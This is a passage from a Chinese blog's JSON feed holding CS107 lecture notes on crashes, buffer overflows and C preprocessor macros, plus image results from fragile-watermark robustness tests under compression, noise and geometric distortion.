class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> <span class=\"token number\">17</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> m <span class=\"token operator\">=</span> <span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_13/image-20231130152133391.png\" alt=\"image-20231130152133391\"></p>\n<p>这样子调用很不合理，但实际上运行就是这样。并且很有可能在运行过程中崩溃，因为 v2 部分没有被初始化，是一个随意的 4 字节地址，不太可能是一个合法的栈指针或者堆指针等等，如果是的话，那就碰巧能跑起来。</p>\n<p>在 C++ 中因为更多的使用模版等内容，不太经常和指针打交道，更不容易崩溃。</p>\n<p>纯 C 语言的编译是  <code>CALL &lt;memcmp&gt;</code></p>\n<p>C ++ 中的语言编译会关注参数，使用不同的签名，对多个版本的 memcmp 进行消歧 ，我们定义的函数就是 <code>CALL &lt;memcmp_void_p&gt;</code> ，而标准库中的函数就是  <code>CALL &lt;memcmp_void_p_void_p_int&gt;</code> ，从这个角度来看 C++ 会更加安全。</p>\n<h2 id=\"举一些为什么程序会崩溃的小例子\"><a class=\"markdownIt-Anchor\" href=\"#举一些为什么程序会崩溃的小例子\">#</a> 举一些为什么程序会崩溃的小例子</h2>\n<h3 id=\"seg-fault段错误\"><a class=\"markdownIt-Anchor\" href=\"#seg-fault段错误\">#</a> seg fault (段错误)：</h3>\n<p>常出现在对错误的指针进行解引用。如  <code>*(NULL)</code></p>\n<h3 id=\"bus-errors总线错误\"><a class=\"markdownIt-Anchor\" href=\"#bus-errors总线错误\">#</a> bus errors（总线错误）：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp <span class=\"token operator\">=</span> ____<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>vp <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>内存地址从上到下分为四部分：Data 段、Stack 段、Heap 段、Code 段。栈和堆中内存要求首地址都是 4 字节对齐的。如果 vp 就是四个部分中的某部分，那我们有 50% 的可能性得到错误，如果没有报错的话，就说明 vp 是某两个字节的内存块。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>vp <span class=\"token operator\">=</span> <span class=\"token number\">55</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上述地址也是不合法的，因为 int 类型的地址必须是 4 的倍数。</p>\n<h3 id=\"缓冲区溢出\"><a class=\"markdownIt-Anchor\" href=\"#缓冲区溢出\">#</a> 缓冲区溢出</h3>\n<h4 id=\"一个数组越界例子\"><a class=\"markdownIt-Anchor\" href=\"#一个数组越界例子\">#</a> 一个数组越界例子</h4>\n<p>对于这段代码，i = 4 的时候，array [4] = 0 即将 i 地址的内容重新赋值为 0，因此程序会不断的进行循环。这种错误被称为缓冲区溢出。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_13/image-20231130155736250.png\" alt=\"image-20231130155736250\"></p>\n<h4 id=\"一个数组越界例子改为short数组\"><a class=\"markdownIt-Anchor\" href=\"#一个数组越界例子改为short数组\">#</a> 一个数组越界例子（改为 short 数组）</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">short</span> array<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这样的代码在运行阶段可能不会陷入死循环。</p>\n<p>大端存储不会陷入死循环，只是会多进行一次赋值操作。</p>\n<p>小端存储就会陷入死循环，原因和前面的 int 数组的原因是一样的：</p>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_13/image-20231130160504339.png\" alt=\"image-20231130160504339\"></p>\n<h4 id=\"一个之前期中考试的例子\"><a class=\"markdownIt-Anchor\" href=\"#一个之前期中考试的例子\">#</a> 一个之前期中考试的例子</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;=</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>数组越界后，会擅自对 saved PC 的值减 4。</p>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_13/image-20231130161109940.png\" alt=\"image-20231130161109940\"></p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/28/%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/",
            "url": "http://yanagi-kon.github.io/2023/11/28/%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/",
            "title": "",
            "date_published": "2023-11-28T12:20:38.702Z",
            "content_html": "<h1 id=\"完全脆弱性水印\"><a class=\"markdownIt-Anchor\" href=\"#完全脆弱性水印\">#</a> 完全脆弱性水印</h1>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128203512391.png\" alt=\"image-20231128203512391\"></p>\n<h2 id=\"对照组\"><a class=\"markdownIt-Anchor\" href=\"#对照组\">#</a> 对照组</h2>\n<p>下面是原图和水印信息：</p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/ori.jpg\" alt=\"原图\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/watermark.jpg\" alt=\"watermark\"></p>\n<p>下面是使用 QR 嵌入水印后不进行任何处理后的输出：</p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128202318514.png\" alt=\"image-20231128202318514\"></p>\n<h2 id=\"jpeg压缩攻击\"><a class=\"markdownIt-Anchor\" href=\"#jpeg压缩攻击\">#</a> JPEG 压缩攻击</h2>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg-17011748306785.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract-17011748396047.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128203408780.png\" alt=\"image-20231128203408780\"></p>\n<h2 id=\"高斯噪声\"><a class=\"markdownIt-Anchor\" href=\"#高斯噪声\">#</a> 高斯噪声</h2>\n<p>方差 0.005</p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg-170117505637611.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract-170117506436413.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128203758429.png\" alt=\"image-20231128203758429\"></p>\n<p>0.001</p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg-170117510342715.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract-170117510767317.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128203836675.png\" alt=\"image-20231128203836675\"></p>\n<h2 id=\"椒盐噪声\"><a class=\"markdownIt-Anchor\" href=\"#椒盐噪声\">#</a> 椒盐噪声</h2>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg-170117517748519.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract-170117518270221.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128203957926.png\" alt=\"image-20231128203957926\"></p>\n<h2 id=\"缩放攻击\"><a class=\"markdownIt-Anchor\" href=\"#缩放攻击\">#</a> 缩放攻击</h2>\n<p>0.8</p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg-170117537450423.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract-170117538516525.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128204319500.png\" alt=\"image-20231128204319500\"></p>\n<h2 id=\"中心裁剪攻击\"><a class=\"markdownIt-Anchor\" href=\"#中心裁剪攻击\">#</a> 中心裁剪攻击</h2>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg-170117554852327.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract-170117555583929.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128204603157.png\" alt=\"image-20231128204603157\"></p>\n<h2 id=\"旋转攻击\"><a class=\"markdownIt-Anchor\" href=\"#旋转攻击\">#</a> 旋转攻击</h2>\n<p>10 度</p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg-170117562865831.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract-170117563332633.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128204721379.png\" alt=\"image-20231128204721379\"></p>\n<h2 id=\"高斯低通滤波\"><a class=\"markdownIt-Anchor\" href=\"#高斯低通滤波\">#</a> 高斯低通滤波</h2>\n<p>窗口 3*3</p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg-170117588396035.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract-170117588876637.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128205143685.png\" alt=\"image-20231128205143685\"></p>\n<h2 id=\"均值滤波\"><a class=\"markdownIt-Anchor\" href=\"#均值滤波\">#</a> 均值滤波</h2>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Wateredimg-170117601988039.jpg\" alt=\"Wateredimg\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/Extract-170117602358441.jpg\" alt=\"Extract\"></p>\n<p><img data-src=\"%E8%84%86%E5%BC%B1%E6%80%A7%E6%B0%B4%E5%8D%B0/image-20231128205442671.png\" alt=\"image-20231128205442671\"></p>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/26/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_12/",
            "url": "http://yanagi-kon.github.io/2023/11/26/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_12/",
            "title": "斯坦福编程范式CS107_12",
            "date_published": "2023-11-26T00:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_12\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_12\">#</a> 斯坦福编程范式 CS107_12</h1>\n<h2 id=\"编译过程的三个阶段接着上节课\"><a class=\"markdownIt-Anchor\" href=\"#编译过程的三个阶段接着上节课\">#</a> 编译过程的三个阶段（接着上节课）</h2>\n<h3 id=\"预处理阶段\"><a class=\"markdownIt-Anchor\" href=\"#预处理阶段\">#</a> 预处理阶段</h3>\n<p>#define 对全局变量进行简单的替换。</p>\n<p>#define 对于宏定义的处理</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">MAX</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span></span></span></pre></td></tr></table></figure><p>#define 这种简单的替换在汇编语言中一般就两三行，但如果采用函数的形式，则会需要更多汇编语言，因为函数中的申请变量、返回等操作占用了大量的开销。</p>\n<p>这串代码在预处理阶段不会报错。在后续的编译中会报错。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">MAX</span><span class=\"token punctuation\">(</span><span class=\"token number\">40.2</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"HELLO\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>assert 的宏定义</strong>。是的，assert 在 C 语言中其实是一种宏定义。</p>\n<p>这条宏定义的意义就是，如果语句 cond 中的内容为真，就什么也不做，(void) 0 表示将 0 转换为 void 类型，不进行返回值，在汇编中这里不会产生汇编代码。如果为假，就输出正在编译的文件名，并退出程序。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">assert</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>cond<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>cond<span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span></span><span class=\"token string\">\"正在编译的文件名\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr></table></figure><p>如果采用了 NO DEBUG 模式，就会将所有的 assert 部分替换为 空。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">NDEBUG</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">assert</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>cond<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">assert</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>cond<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>cond<span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span></span><span class=\"token string\">\"正在编译的文件名\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr></table></figure><h4 id=\"预处理器的一些不足\"><a class=\"markdownIt-Anchor\" href=\"#预处理器的一些不足\">#</a> 预处理器的一些不足</h4>\n<p>对于下述式子，如果斐波那契 100 比较大，那么最终会运行两遍的求斐波那契 100 的函数，编译器不会进行中间值的保留，因为它认为你的式子就是这样写的，计算两次斐波那契数或者 factorial (4000)。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> max <span class=\"token operator\">=</span> <span class=\"token function\">MAX</span><span class=\"token punctuation\">(</span><span class=\"token function\">fib</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token function\">fact</span><span class=\"token punctuation\">(</span><span class=\"token number\">4000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 对于上述宏定义进行展开后，将会是:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> max <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">fib</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token function\">fact</span><span class=\"token punctuation\">(</span><span class=\"token number\">4000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token function\">fib</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token function\">fact</span><span class=\"token punctuation\">(</span><span class=\"token number\">4000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这样的式子更加明确的表明，在实际程序中，可能会出现的冗余计算或错误。</p>\n<p>最终的结果如果是 m 比较大的话，m 会自增 2，n 则会自增 1。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> max <span class=\"token operator\">=</span> <span class=\"token function\">MAX</span><span class=\"token punctuation\">(</span>m<span class=\"token operator\">++</span><span class=\"token punctuation\">,</span>n<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>预处理器的这些不足会可能让你很难找出你代码的问题出在了哪里，尤其是对于一些工程量巨大的项目，除非你能保证你能一次就写出正确的 C++ 代码，那几乎是不太可能的。C 语言在它诞生的 60 年代时程序还都非常的小巧，所以能很容易的找到问题，现在就不太行了。</p>\n<h4 id=\"include\"><a class=\"markdownIt-Anchor\" href=\"#include\">#</a> #include</h4>\n<p>尖括号和双引号的区别。</p>\n<p>当使用尖括号来包括.h 文件时，对于预处理器这意味着这是个系统头文件，因此这个头文件应该是编译器提供的，因此可以通过默认路径找到这些文件；如果使用的是双引号，那么编译器会假设这是个用户编写的.h 文件，因此会默认从当前的工作目录查找该头文件。</p>\n<p>对于 #include 头文件，在预处理过程中会在目录中进行查找，并将查找到的头文件中的内容对这一行进行替换。#include 操作是递归的，意思就是如果你的头文件中还含有 #include 内容，那么系统就会继续查找下去，直到到达最底层。最终要交给编译器的文件是不会包括任何 include 或 define 符号的。</p>\n<p>预处理器对每一个已经处理过的头文件，都会加入 Hash 表中，以避免重复的替换某一个头文件。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"vector.h\"</span></span></pre></td></tr></table></figure><h3 id=\"编译阶段-和-链接阶段\"><a class=\"markdownIt-Anchor\" href=\"#编译阶段-和-链接阶段\">#</a> 编译阶段 和 链接阶段</h3>\n<p>基于 GCC 的。</p>\n<h4 id=\"mainc\"><a class=\"markdownIt-Anchor\" href=\"#mainc\">#</a> main.c</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span>\t<span class=\"token comment\">//printf</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span>\t<span class=\"token comment\">//malloc,free</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>memory <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>memory <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token 